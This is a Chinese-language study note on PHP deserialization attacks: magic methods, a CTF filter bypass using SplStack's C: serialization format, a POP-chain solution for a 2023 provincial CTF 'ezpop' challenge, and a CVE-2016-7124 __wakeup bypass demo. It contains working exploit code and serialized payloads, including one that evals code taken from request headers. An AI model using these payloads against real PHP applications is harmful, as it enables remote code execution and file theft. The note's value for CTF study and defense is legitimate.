PHP反序列化漏洞整理

前置知识

序列化与反序列化

所谓序列化是将一个对象（标量、数组或自定义类）转化为统一的字符串形式，反序列化函数接收这个字符串可以还原出这个对象。

序列化的内容只是对象的成员变量的值，不能做到把类内方法也打包，换句话说，序列化是存储一个已经定义的类的实例，而不是类本身。做反序列化操作时要求这个类必须已经有定义，然后反序列化函数将把成员变量的值填充到类的一个实例并返回这个实例。

一个简单的例子：

<?php
class pika{
    public $var;
    public $q;
    public function show()
    {
        echo "pika_".$this->var;
    }
}

# 建立一个对象并序列化
$p = new pika();
$p->var = "111";
$p->q = 0;
echo serialize($p);

# O:4:"pika":2:{s:3:"var";s:3:"111";s:1:"q";i:0;}
<?php
class pika{
    public $var;
    public $q;
    public function show()
    {
        echo "pika_".$this->var;
    }
}

# 反序列化恢复上面的对象
$p = unserialize('O:4:"pika":2:{s:3:"var";s:3:"111";s:1:"q";i:0;}');

$p->show();

# pika_111

开头的O:标记声明一个对象，还有别的标记比如a:声明一个数组，S:声明一个字符串等等。

魔法函数

魔法函数是类内的特殊方法，在满足特定条件时自动触发而不需要主动调用，看一个例子：

<?php
class pika{
    public $var;
    public $q;
    public function __toString()
    {
        echo "Magic function is triggered.";
        return "pika!";
    }
    public function show()
    {
        echo "pika_".$this->var;
    }
}

$p = unserialize('O:4:"pika":2:{s:3:"var";s:3:"111";s:1:"q";i:0;}');

$t = $p."123";

# Magic function is triggered.

上面的代码试图将pika类型对象p作为字符串与”123”拼接赋值给t，__toString()方法自动触发（此时t的值应当为”pika!123”）。

常见魔法函数：

魔法函数 触发条件
__sleep() 进行序列化时首先触发
__wakeup() 进行反序列化时首先触发
__toString() 对象被当成字符串调用时触发
__invoke() 对象被当成函数调用时触发
__construct() 构造函数，new一个对象时触发，反序列化不会触发
__destruct() 析构函数，对象销毁时触发。代码正常执行结束会自动销毁对象，或者可以将对象重新赋值为其他类型完成主动销毁
__call() 调用对象的不存在或不可访问的方法时触发
__callStatic() 与__call()类似，调用不存在或不可访问的静态方法时触发
__get() 调用不存在或不可访问的成员变量时触发
__set() 写入不存在或不可访问的成员变量时触发
__isset() 对不存在或不可访问属性调用isset()或empty()时触发
__unset() 对不存在或不可访问属性调用unset()时触发

分析源码，思路显然是要反序列化evil类触发__destruct方法，并且绕过两个正则过滤执行eval进行RCE。

  • __destruct函数内部的正则过滤要求$cmd只能包含字母下划线和圆括号，需要使用无参RCE。
  • 执行eval时在$cmd后拼接了一个无意义字符串，需要使用__halt_compiler();掐掉执行过程防止报错。
  • 对序列化字符串过滤了O:和a:开头后跟数字，以及几个特定单词。正常进行一个对象的序列化是O开头，数组是a，这里都不能用，需要用C绕过。

Trick: Serializable接口与C标识

关于Serializable接口：php手册

C:是一个特殊的标识，只有已经实现了Serializable接口的类才能产生C开头的序列化字符串。

这里我们需要使用符合上述条件的PHP内置类，如SplStack.

exp（环境是php7.0）:

<?php
class evil{
    public $cmd="eval(end(getallheaders()));__halt_compiler();";
}

$a=new SplStack();
$a->push(new evil());
$b=serialize($a);
echo($b);

payload: 

?Pochy=C:8:"SplStack":83:{i:6;:O:4:"evil":1:{s:3:"cmd";s:45:"eval(end(getallheaders()));__halt_compiler();";}}

POP链

简而言之就是通过构造特殊的序列化字符串，把魔法函数串起来调用。

2023陕西省赛 ezpop

<?php
highlight_file(__FILE__);

class night
{
    public $night;

    public function __destruct(){
        echo $this->night . '哒咩哟';
    }
}

class day
{
    public $day;

    public function __toString(){
        echo $this->day->go();
    }

    public function __call($a, $b){
        echo $this->day->getFlag();
    }
}


class light
{
    public $light;

    public function __invoke(){
        echo $this->light->d();
    }
}

class dark
{
    public $dark;

    public function go(){
        ($this->dark)();
    }

    public function getFlag(){
        include(hacked($this->dark));
    }
}

function hacked($s) {
    if(substr($s, 0,1) == '/'){
        die('呆jio步');
    }
    $s = preg_replace('/\.\.*/', '.', $s);
    $s = urldecode($s);
    $s = htmlentities($s, ENT_QUOTES, 'UTF-8');
    return strip_tags($s);
}

$un = unserialize($_POST['‮⁦快给我传参⁩⁦pop']); //
throw new Exception('seino');

这题有个恶心的地方就是post参数名包含特殊控制字符，看起来名字是pop，实际上长这样：

先不管这个，来分析一下pop链怎么构造，先找头和尾：

  • 最终目的是执行dark类的getFlag()方法，include(“\flag”)，那个hacked函数过滤拿url编码绕一下就行，毫无障碍。
  • 代码只做了一个unserialize，又没有__wakeup()，入口只能是night类的__destruct()方法，在对象销毁时调用。

之后就是顺藤摸瓜，比如要调用dark类的getFlag()，发现在day类的__call方法里出现getFlag()，那就把day类对象的成员变量$day赋值为一个dark类。然后再去找哪里可以触发__call()，从下往上一路摸到night类的__destruct里面就完事了。

pop链构造：

$a = new night();
$a->night = new day();
$a->night->day = new dark();
$a->night->day->dark = new light();
$a->night->day->dark->light = new day();
$a->night->day->dark->light->day = new dark();
$a->night->day->dark->light->day->dark = "%2Fflag";

$s = serialize($a);
echo $s;

这样$a是一个night类，当触发$a的__destruct方法，执行echo语句时$this->night被作为字符串调用，然而$a的$night属性被我们构造成了一个day类，这样就又会触发day类的__toString方法，以此类推。

Trick: 利用数组主动销毁对象

至此pop链是没问题了，但是实际上这样传进去__destruct方法还不会触发，因为末尾抛出了一个异常导致没法执行正常的对象销毁流程，我们需要手动销毁，利用数组：

$s = serialize(array($a,null));
echo $s;
# a:2:{i:0;O:5:"night":1:{s:5:"night";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";O:5:"light":1:{s:5:"light";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";s:7:"%2Fflag";}}}}}}i:1;N;}

拿到上面的输出，手动把数组第二项null的索引i:1改成i:0:

a:2:{i:0;O:5:"night":1:{s:5:"night";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";O:5:"light":1:{s:5:"light";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";s:7:"%2Fflag";}}}}}}i:0;N;}

这样在反序列化执行的时候，把索引为0的数组元素覆盖成了null，完成主动销毁。

CVE-2016-7124漏洞

CVE-2016-7124可以绕过反序列化时__wakeup()方法的执行，此漏洞有效的php版本：PHP before 5.6.25 and 7.x before 7.0.10

具体利用方法：当反序列化字符串O:标记后跟的属性个数大于实际个数，则会跳过__wakeup()。

测试发现php5和php7的表现不一样，下面做简单展示。

写一个测试脚本:

<?php
class pika{
    public $var = "00";
    public $q = "qw";
    public function __wakeup()
    {
        echo "wakeup! ";
    }
    public function __destruct()
    {
        echo "destruct pika_".$this->var;
    }
}

unserialize($_GET['p']);

构造序列化字符串：

<?php
class pika{
    public $var;
    public $q;
}

$p = new pika();
$p->var = "01";

$s = serialize($p);
echo $s;

# O:4:"pika":2:{s:3:"var";s:2:"01";s:1:"q";N;}

向测试脚本传参，正常输出：wakeup! destruct pika_01

更改序列化字符串：
O:4:"pika":3:{s:3:"var";s:2:"01";s:1:"q";N;}

php5.5.2版本输出：destruct pika_01

php7.0.6版本输出：destruct pika_00

可以看到跳过了__wakeup的执行，在php5中，后面成员变量的赋值正常进行，而在php7中，成员变量保持初始状态，未被反序列化字符串赋值。

此外还发现把成员变量的名字的长度更改后__wakeup也不会执行，并且成员变量保持初始状态。

传入：O:4:"pika":2:{s:4:"var";s:2:"01";s:1:"q";N;}

这里”var”的长度本来声明是3，改成了4

输出：destruct pika_00，在php5和php7下表现一致。

猜测这个特性的有效范围与CVE-2016-7124一致，不在此范围的php版本下直接报错退出了。
